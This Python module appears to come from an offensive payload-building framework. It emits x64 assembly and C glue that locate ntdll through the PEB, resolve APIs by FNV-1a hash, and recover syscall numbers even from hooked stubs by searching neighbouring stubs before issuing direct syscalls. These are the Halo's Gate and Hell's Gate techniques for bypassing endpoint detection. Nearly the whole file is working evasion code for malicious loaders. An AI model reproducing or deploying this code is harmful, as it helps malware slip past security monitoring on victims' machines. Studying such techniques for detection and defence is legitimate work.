import random
import string
import tempfile
import os
import subprocess
from c.utils.typedefs import typedefs

class halosgatehash:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        fd, file_path = tempfile.mkstemp(suffix='.asm')
        self.outfd, self.outfile_path = tempfile.mkstemp(suffix='.o')
        self.typedefs = typedefs
        with os.fdopen(fd, 'w') as f:
            inline_assembly = """
bits 64
section .text
global getntdll
global getExportTable
global getExAddressTable
global getExNamePointerTable
global getExOrdinalTable
global getApiAddr
global findSyscallNumber
global halosGateUp
global halosGateDown
global HellsGate
global HellDescent
global compExplorer


getntdll:
    push rbx
    xor rax, rax                ; zero RAX only, no RDI involved
    mov rcx, [gs:rax+60h]       ; PEB
    mov rcx, [rcx+18h]          ; PEB->Ldr
    mov rcx, [rcx+20h]          ; InMemoryOrderModuleList.Flink
    mov rcx, [rcx]              ; second entry (ntdll)
    mov rcx, [rcx+20h]          ; DllBase
    mov rax, rcx
    pop rbx
    ret


; Get ExportTable Address of supplied module DLL
getExportTable:
    push rbx
	mov rbx, rcx            ; RBX = Supplied Module Address
	mov r8, rcx             ; R8  = Supplied Module Address
	mov ebx, [rbx+3Ch]      ; RBX = Offset NewEXEHeader
	add rbx, r8             ; RBX = &ntdll.dll + Offset NewEXEHeader = &NewEXEHeader
	xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
	add cx, 88ffh
	shr rcx, 8h             ; RCX = 0x88ff --> 0x88
	mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
	add rdx, r8             ; RDX = &ntdll.dll + RVA ExportTable = &ExportTable
	mov rax, rdx            ; RAX = &module.ExportTable
    pop rbx
	ret                     ; return to caller


; Get &module.ExportTable.AddressTable from &module.ExportTable
getExAddressTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r10, r10
	mov r10d, [rdx+1Ch]     ; RDI = RVA AddressTable
	add r10, r8             ; R10 = &AddressTable
	mov rax, r10            ; RAX = &module.ExportTable.AddressTable
    pop rbx
	ret                     ; return to caller


; Get &module.NamePointerTable from &module.ExportTable
getExNamePointerTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r11, r11
	mov r11d, [rdx+20h]     ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
	add r11, r8             ; R11 = &NamePointerTable (Memory Address of module Export NamePointerTable)
	mov rax, r11            ; RAX = &module.ExportTable.NamePointerTable
    pop rbx
	ret                     ; return to caller

; Get &OrdinalTable from ntdll.dll ExportTable
getExOrdinalTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r10, r10
	mov r10d, [rdx+24h]     ; R12 = RVA  OrdinalTable
	add r10, r8             ; R12 = &OrdinalTable
	mov rax, r10            ; RAX = &module.ExportTable.OrdinalTable
    pop rbx
	ret                     ; return to caller

; Get the address of the API from the module ExportTable
; IN: &Module.ExportTable.NamePointerTable + &Module
getApiAddr:
	mov r10, r9             ; R10 = &module.ExportTable.AddressTable
	mov r11, [rsp+28h]      ; R11 = &module.ExportTable.NamePointerTable
	mov r12, [rsp+30h]      ; R12 = &module.ExportTable.OrdinalTable
	xor rax, rax            ; Setup Counter for resolving the API Address after finding the name string
	push rcx                ; push the string length counter to stack
	jmp short getApiAddrLoop

getApiAddrLoop:
	mov rcx, [rsp]          ; reset the string length counter from the stack
	xor rdi, rdi            ; Clear RDI for setting up string name retrieval
	mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
	add rdi, r8             ; RDI = &NameString    = RVA NameString + &module.dll
	mov rsi, rdx            ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
    
    push rax;
    push rcx;
    push rdx;

hash_compare:
    mov eax, 0x811C9DC5
    mov rdx, rdi

.loop:
    movzx ecx, byte [rdx]
    test ecx, ecx
    jz .done

    xor eax, ecx
    imul eax, eax, 0x01000193
    inc rdx
    jmp .loop

.done:
    cmp eax, esi
    pop rdx;
    pop rcx;
    pop rax;
    je getApiAddrFin
    
	inc rax
	jmp short getApiAddrLoop

; Find the address of GetProcAddress by using the last value of the Counter
getApiAddrFin:
	pop rcx                 ; remove string length counter from top of stack
	mov ax, [r12+rax*2]     ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
	mov eax, [r10+rax*4]    ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
	add rax, r8             ; RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
	ret                     ; return to API caller

; Find the syscall number for the NTDLL API with provided API address
; RCX = NTDLL.<API> Address
findSyscallNumber:
	xor rsi, rsi
	xor rdi, rdi 
	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub (mov r10,rcx;mov eax,<syscall#>)
	cmp rsi, rdi
	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
	xor rax,rax            ; clear RAX as it will hold the syscall
	mov ax, [rcx+4]        ; The systemcall number
	ret                    ; return to caller

; RCX = &NTDLL.<API> | RDX = 32bytes * Up Increment 
halosGateUp:
	xor rsi, rsi
	xor rdi, rdi 
	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
	xor rax, rax
	mov al, 20h            ; 32 * Increment = Syscall Up
	mul dx                 ; RAX = RAX * RDX = 32 * Syscall Up
	add rcx, rax           ; RCX = NTDLL.API +- Syscall Stub
	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Up by HalosGate (mov r10, rcx; mov eax, <syscall#>)
	cmp rsi, rdi
	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
	xor rax,rax            ; clear RAX as it will hold the syscall
	mov ax, [rcx+4]        ; The systemcall number for the API close to the target
	ret                    ; return to caller


; RCX = &NTDLL.<API> | RDX = 32bytes * Down Increment 
halosGateDown:
	xor rsi, rsi
	xor rdi, rdi 
	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
	xor rax, rax
	mov al, 20h            ; 32 * Increment = Syscall Down
	mul dx                 ; RAX = RAX * RDX = 32 * Syscall Down
	sub rcx, rax           ; RCX = NTDLL.API - Syscall Stub
	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Down by HalosGate (mov r10, rcx; mov eax, <syscall#>)
	cmp rsi, rdi
	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
	xor rax,rax            ; clear RAX as it will hold the syscall
	mov ax, [rcx+4]        ; The systemcall number for the API close to the target
	ret                    ; return to caller

error:
	xor rax, rax ; return 0 for error
	ret          ; return to caller

HellsGate:
	xor r11, r11
	mov r11d, ecx
	ret

HellDescent:
	xor rax, rax
	mov r10, rcx
	mov eax, r11d
	syscall
	ret
"""
            f.write(inline_assembly)
        result = subprocess.run(['nasm', '-f', 'win64', file_path, '-o', self.outfile_path])
        os.unlink(file_path)

    def imports(self) -> list[str]:
        return ['#include <windows.h>',"#include <assert.h>"]

    def compilerOptions(self) -> list[str]:
        return [self.outfile_path]
    
    def codeblocks(self) -> str:
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] in ['Nt', 'Zw', 'Rt']:
                ntdll.append(apicall)

        codeblock += f"""
extern VOID HellsGate(WORD wSystemCall);
extern NTSTATUS HellDescent(...);

EXTERN_C PVOID getntdll();

EXTERN_C PVOID getExportTable(
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExAddressTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExNamePointerTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExOrdinalTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getApiAddr(
	IN DWORD apiNameStringLen,
	IN DWORD apiNameHash,
	IN PVOID moduleAddr,
	IN PVOID ExExAddressTable,
	IN PVOID ExNamePointerTable,
	IN PVOID ExOrdinalTable
);

EXTERN_C DWORD findSyscallNumber(
	IN PVOID ntdllApiAddr
);

EXTERN_C DWORD halosGate(
	IN PVOID ntdllApiAddr,
	IN WORD index
);

EXTERN_C DWORD compExplorer(
	IN PVOID explorerWString
);

PVOID ntdll = NULL;
PVOID ntdllExportTable = NULL;

PVOID ntdllExAddrTbl = NULL;
PVOID ntdllExNamePtrTbl = NULL;
PVOID ntdllExOrdinalTbl = NULL;

__attribute__((constructor)) void {self.name}(){{

    ntdll = getntdll();
    ntdllExportTable = getExportTable(ntdll);
    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdll);
    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdll);
    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdll);
    Sleep(0);
}}
"""
        return codeblock


    def resolve(self, apicalls):
        resolved = {}
        self.apicalls = apicalls
        for apicall in apicalls:
            if 'Nt' not in apicall:
                resolved[apicall] = apicall
            else:
                resolved[apicall] = f"""
    DWORD {apicall}_ssn = findSyscallNumber(getApiAddr({len(apicall)}, {self.hashstring(apicall)}, ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));
    HellsGate({apicall}_ssn);
    HellDescent"""
        return resolved

    def hashstring(self, functionName) -> int:
        value = 0x811C9DC5

        for character in functionName:
            if character == 0:
                break
            value = ((value ^ ord(character)) * 0x01000193) & 0xFFFFFFFF

        return value